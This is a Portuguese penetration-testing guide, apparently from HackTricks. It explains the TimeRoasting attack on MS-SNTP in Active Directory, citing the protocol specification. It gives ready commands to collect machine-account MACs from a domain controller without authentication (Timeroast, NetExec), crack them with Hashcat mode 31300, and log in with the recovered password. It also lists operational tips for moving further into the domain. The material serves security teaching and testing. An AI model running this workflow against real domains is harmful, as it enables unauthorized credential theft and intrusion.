# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting explora a extensão legada de autenticação MS-SNTP. No MS-SNTP, um cliente pode enviar uma solicitação de 68 bytes que inclui qualquer RID de conta de computador; o controlador de domínio usa o hash NTLM (MD4) da conta de computador como chave para calcular um MAC sobre a resposta e o retorna.<sup>[[1]](#references)</sup> Os atacantes podem coletar esses MACs do MS-SNTP sem autenticação e quebrá-los offline (modo 31300 do Hashcat) para recuperar as senhas das contas de computador.<sup>[[2]](#references)</sup>

Consulte a seção 3.1.5.1 "Authentication Request Behavior" e a seção 4 "Protocol Examples" da especificação oficial do MS-SNTP para obter detalhes.<sup>[[1]](#references)</sup>
![TimeRoasting: Consulte a seção 3.1.5.1 "Authentication Request Behavior" e a seção 4 "Protocol Examples" da especificação oficial do MS-SNTP para obter detalhes](../../images/Pasted%20image%2020250709114508.png)
Quando o elemento ADM ExtendedAuthenticatorSupported é false, o cliente envia uma solicitação de 68 bytes e inclui o RID nos 31 bits menos significativos do subcampo Key Identifier do authenticator.<sup>[[1]](#references)</sup>

> Se o elemento ADM ExtendedAuthenticatorSupported for false, o cliente MUST construir uma mensagem Client NTP Request. O comprimento da mensagem Client NTP Request é de 68 bytes. O cliente define o campo Authenticator da mensagem Client NTP Request conforme descrito na seção 2.2.1, gravando os 31 bits menos significativos do valor RID nos 31 bits menos significativos do subcampo Key Identifier do authenticator e, em seguida, gravando o valor Key Selector no bit mais significativo do subcampo Key Identifier.<sup>[[1]](#references)</sup>

Da seção 4 (Protocol Examples):

> Depois de receber a solicitação, o servidor verifica se o tamanho da mensagem recebida é de 68 bytes. Supondo que o tamanho da mensagem recebida seja de 68 bytes, o servidor extrai o RID da mensagem recebida. O servidor usa esse valor para chamar o método NetrLogonComputeServerDigest (conforme especificado na seção 3.5.4.8.2 de [MS-NRPC]) para calcular os crypto-checksums e selecionar o crypto-checksum com base no bit mais significativo do subcampo Key Identifier da mensagem recebida, conforme especificado na seção 3.2.5. Em seguida, o servidor envia uma resposta ao cliente, definindo o campo Key Identifier como 0 e o campo Crypto-Checksum como o crypto-checksum calculado.<sup>[[1]](#references)</sup>

O crypto-checksum é baseado em MD5 (consulte 3.2.5.1.1) e pode ser quebrado offline, possibilitando o ataque de roasting.<sup>[[1]](#references)</sup>

## Como atacar

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - scripts de Timeroasting de Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Ataque prático (não autenticado) com NetExec + Hashcat

- O NetExec pode enumerar e coletar MACs MS-SNTP para RIDs de computadores sem autenticação e exibir hashes `$sntp-ms$` prontos para cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline com o modo 31300 do Hashcat (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- O cleartext recuperado corresponde à senha de uma conta de computador. Tente-a diretamente como a conta da máquina usando Kerberos (-k) quando o NTLM estiver desabilitado:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Dicas operacionais
- Garanta uma sincronização precisa do horário antes do Kerberos: `sudo ntpdate <dc_fqdn>`
- Se necessário, gere o krb5.conf para o realm do AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mapeie os RIDs para principals posteriormente via LDAP/BloodHound assim que tiver qualquer authenticated foothold.

## Referências

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – official docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
